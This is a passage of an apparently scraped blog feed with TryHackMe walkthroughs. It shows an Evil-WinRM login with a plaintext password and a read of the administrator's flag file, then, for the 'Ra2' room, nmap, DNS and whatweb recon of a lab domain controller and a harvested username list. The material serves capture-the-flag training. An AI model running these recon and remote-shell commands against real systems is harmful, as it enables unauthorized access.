class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; net user crazy<br>User name                    crazy<br>Full Name<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            7/8/2022 3:19:52 AM</span><br><span class="hljs-string">Password expires             8/19/2022 3:19:52 AM</span><br><span class="hljs-string">Password changeable          7/9/2022 3:19:52 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Administrators</span><br><span class="hljs-string">Global Group memberships     *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\scripts&gt; </span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">248.134</span> <span class="hljs-literal">-u</span> crazy <span class="hljs-literal">-p</span> qwe123456!<br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">4</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\crazy\Documents&gt; <span class="hljs-built_in">cat</span> ../../administrator/desktop/Flag3.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Ra2</title>
    <link href="/post/TryHackMe-Ra2.html"/>
    <url>/post/TryHackMe-Ra2.html</url>
    
    <content type="html"><![CDATA[<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sat Jul  9 20:48:53 2022 as: nmap -sC -sV -Pn -T4 -oA Ra2 -p- 10.10.75.95</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.75.95<br>Host is up (0.28s latency).<br>Not shown: 65498 filtered tcp ports (no-response)<br>PORT      STATE SERVICE             VERSION<br>53/tcp    open  domain              Simple DNS Plus<br>80/tcp    open  http                Microsoft IIS httpd 10.0<br>|_http-title: Did not follow redirect to https://fire.windcorp.thm/<br>|_http-server-header: Microsoft-IIS/10.0<br>88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-07-09 12:55:45Z)<br>135/tcp   open  msrpc               Microsoft Windows RPC<br>139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn<br>389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:28+00:00; 0s from scanner time.<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm<br>| Not valid before: 2020-05-29T03:31:08<br>|_Not valid after:  2028-05-29T03:41:03<br>443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm<br>| Not valid before: 2020-05-29T03:31:08<br>|_Not valid after:  2028-05-29T03:41:03<br>| tls-alpn: <br>|_  http/1.1<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm<br>| Not valid before: 2020-05-29T03:31:08<br>|_Not valid after:  2028-05-29T03:41:03<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:24+00:00; 0s from scanner time.<br>2179/tcp  open  vmrdp?<br>3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm<br>| Not valid before: 2020-05-29T03:31:08<br>|_Not valid after:  2028-05-29T03:41:03<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:28+00:00; 0s from scanner time.<br>3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm<br>| Not valid before: 2020-05-29T03:31:08<br>|_Not valid after:  2028-05-29T03:41:03<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:26+00:00; 0s from scanner time.<br>3389/tcp  open  ms-wbt-server       Microsoft Terminal Services<br>| rdp-ntlm-info: <br>|   Target_Name: WINDCORP<br>|   NetBIOS_Domain_Name: WINDCORP<br>|   NetBIOS_Computer_Name: FIRE<br>|   DNS_Domain_Name: windcorp.thm<br>|   DNS_Computer_Name: Fire.windcorp.thm<br>|   DNS_Tree_Name: windcorp.thm<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2022-07-09T12:56:47+00:00<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>| ssl-cert: Subject: commonName=Fire.windcorp.thm<br>| Not valid before: 2022-07-08T12:45:04<br>|_Not valid after:  2023-01-07T12:45:04<br>5222/tcp  open  jabber<br>| fingerprint-strings: <br>|   RPCCheck: <br>|_    &lt;stream:error xmlns:stream=<span class="hljs-string">&quot;http://etherx.jabber.org/streams&quot;</span>&gt;&lt;not-well-formed xmlns=<span class="hljs-string">&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;</span>/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;<br>| xmpp-info: <br>|   STARTTLS Failed<br>|   info: <br>|     compression_methods: <br>|     stream_id: 3sfurhowhc<br>|     features: <br>|     unknown: <br>|     capabilities: <br>|     errors: <br>|       invalid-namespace<br>|       (<span class="hljs-built_in">timeout</span>)<br>|     auth_mechanisms: <br>|     xmpp: <br>|_      version: 1.0<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>5223/tcp  open  ssl/hpvirtgrp?<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>5229/tcp  open  jaxflow?<br>5262/tcp  open  jabber<br>| xmpp-info: <br>|   STARTTLS Failed<br>|   info: <br>|     compression_methods: <br>|     stream_id: 4wwwp8d6sn<br>|     features: <br>|     unknown: <br>|     capabilities: <br>|     errors: <br>|       invalid-namespace<br>|       (<span class="hljs-built_in">timeout</span>)<br>|     auth_mechanisms: <br>|     xmpp: <br>|_      version: 1.0<br>| fingerprint-strings: <br>|   RPCCheck: <br>|_    &lt;stream:error xmlns:stream=<span class="hljs-string">&quot;http://etherx.jabber.org/streams&quot;</span>&gt;&lt;not-well-formed xmlns=<span class="hljs-string">&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;</span>/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;<br>5263/tcp  open  ssl/unknown<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>5269/tcp  open  xmpp                Wildfire XMPP Client<br>| xmpp-info: <br>|   STARTTLS Failed<br>|   info: <br>|     compression_methods: <br>|     xmpp: <br>|     features: <br>|     capabilities: <br>|     unknown: <br>|     errors: <br>|       (<span class="hljs-built_in">timeout</span>)<br>|_    auth_mechanisms: <br>5270/tcp  open  ssl/xmp?<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:26+00:00; 0s from scanner time.<br>5275/tcp  open  jabber<br>| xmpp-info: <br>|   STARTTLS Failed<br>|   info: <br>|     compression_methods: <br>|     stream_id: 7p6gvbkld<br>|     features: <br>|     unknown: <br>|     capabilities: <br>|     errors: <br>|       invalid-namespace<br>|       (<span class="hljs-built_in">timeout</span>)<br>|     auth_mechanisms: <br>|     xmpp: <br>|_      version: 1.0<br>| fingerprint-strings: <br>|   RPCCheck: <br>|_    &lt;stream:error xmlns:stream=<span class="hljs-string">&quot;http://etherx.jabber.org/streams&quot;</span>&gt;&lt;not-well-formed xmlns=<span class="hljs-string">&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;</span>/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;<br>5276/tcp  open  ssl/unknown<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-09T12:57:25+00:00; 0s from scanner time.<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>7070/tcp  open  http                Jetty 9.4.18.v20190429<br>|_http-server-header: Jetty(9.4.18.v20190429)<br>|_http-title: Openfire HTTP Binding Service<br>7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429<br>|_http-title: Openfire HTTP Binding Service<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>|_http-server-header: Jetty(9.4.18.v20190429)<br>7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)<br>| socks-auth-info: <br>|_  No authentication<br>9090/tcp  open  zeus-admin?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Date: Sat, 09 Jul 2022 12:55:45 GMT<br>|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT<br>|     Content-Type: text/html<br>|     Accept-Ranges: bytes<br>|     Content-Length: 115<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;&lt;/title&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;refresh&quot;</span> content=<span class="hljs-string">&quot;0;URL=index.jsp&quot;</span>&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Date: Sat, 09 Jul 2022 12:55:54 GMT<br>|     Allow: GET,HEAD,POST,OPTIONS<br>|   JavaRMI, drda, ibm-db2-das, informix: <br>|     HTTP/1.1 400 Illegal character CNTL=0x0<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 69<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;<br>|   SqueezeCenter_CLI: <br>|     HTTP/1.1 400 No URI<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 49<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;<br>|   WMSRequest: <br>|     HTTP/1.1 400 Illegal character CNTL=0x1<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 69<br>|     Connection: close<br>|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;<br>9091/tcp  open  ssl/xmltec-xmlmail?<br>| ssl-cert: Subject: commonName=fire.windcorp.thm<br>| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br>| Not valid before: 2020-05-01T08:39:00<br>|_Not valid after:  2025-04-30T08:39:00<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP: <br>|     HTTP/1.1 400 Illegal character CNTL=0x0<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 69<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;<br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Date: Sat, 09 Jul 2022 12:56:08 GMT<br>|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT<br>|     Content-Type: text/html<br>|     Accept-Ranges: bytes<br>|     Content-Length: 115<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;&lt;/title&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;refresh&quot;</span> content=<span class="hljs-string">&quot;0;URL=index.jsp&quot;</span>&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Date: Sat, 09 Jul 2022 12:56:10 GMT<br>|     Allow: GET,HEAD,POST,OPTIONS<br>|   Help: <br>|     HTTP/1.1 400 No URI<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 49<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;<br>|   RPCCheck: <br>|     HTTP/1.1 400 Illegal character OTEXT=0x80<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 71<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;<br>|   RTSPRequest: <br>|     HTTP/1.1 400 Unknown Version<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 58<br>|     Connection: close<br>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;<br>|   SSLSessionReq: <br>|     HTTP/1.1 400 Illegal character CNTL=0x16<br>|     Content-Type: text/html;charset=iso-8859-1<br>|     Content-Length: 70<br>|     Connection: close<br>|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;<br>9389/tcp  open  mc-nmf              .NET Message Framing<br>49666/tcp open  msrpc               Microsoft Windows RPC<br>49667/tcp open  msrpc               Microsoft Windows RPC<br>49669/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0<br>49670/tcp open  msrpc               Microsoft Windows RPC<br>49673/tcp open  msrpc               Microsoft Windows RPC<br>49699/tcp open  msrpc               Microsoft Windows RPC<br>56596/tcp open  msrpc               Microsoft Windows RPC<br>Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-07-09T12:56:53<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sat Jul  9 20:57:44 2022 -- 1 IP address (1 host up) scanned in 530.81 seconds</span><br></code></pre></td></tr></table></figure><h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dig windcorp.thm any @10.10.75.95<br><br>; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; windcorp.thm any @10.10.75.95<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 31563</span><br><span class="hljs-string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;windcorp.thm.INANY</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">windcorp.thm.600INA10.10.75.95</span><br><span class="hljs-string">windcorp.thm.3600INNSfire.windcorp.thm.</span><br><span class="hljs-string">windcorp.thm.3600INSOAfire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600</span><br><span class="hljs-string">windcorp.thm.86400INTXT&quot;THM&#123;Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources&#125;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ADDITIONAL SECTION:</span><br><span class="hljs-string">fire.windcorp.thm.3600INA10.10.75.95</span><br><span class="hljs-string">fire.windcorp.thm.3600INA192.168.112.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 310 msec</span><br><span class="hljs-string">;; SERVER: 10.10.75.95#53(10.10.75.95)</span><br><span class="hljs-string">;; WHEN: Sat Jul 09 21:34:16 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 302</span><br></code></pre></td></tr></table></figure><h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709210133191.png" alt="image-20220709210133191"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb https://fire.windcorp.thm/<br>https://fire.windcorp.thm/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[Edeltraut@fire.windcorp.thm,Edward@fire.windcorp.thm,Emile@fire.windcorp.thm,angrybird253@fire.windcorp.thm,brownostrich284@fire.windcorp.thm,buse@fire.windcorp.thm,goldencat416@fire.windcorp.thm,happymeercat399@fire.windcorp.thm,orangegorilla428@fire.windcorp.thm,organicfish718@fire.windcorp.thm,organicwolf509@fire.windcorp.thm,sadswan869@fire.windcorp.thm,tinygoose102@fire.windcorp.thm,tinywolf424@fire.windcorp.thm,whiteleopard529@fire.windcorp.thm], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.75.95], JQuery, Microsoft-IIS[10.0], Script, Title[Windcorp.], X-Powered-By[ASP.NET]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Edeltraut<br>Edward<br>Emile<br>angrybird253<br>brownostrich284<br>buse<br>goldencat416<br>happymeercat399<br>orangegorilla428<br>organicfish718<br>organicwolf509<br>sadswan869<br>tinygoose102<br>tinywolf424<br>whiteleopard529<br>Emilieje<br>lilyle<br>kirkug<br>Emily Jensen<br>Lily Levesque<br>Kirk Uglas<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 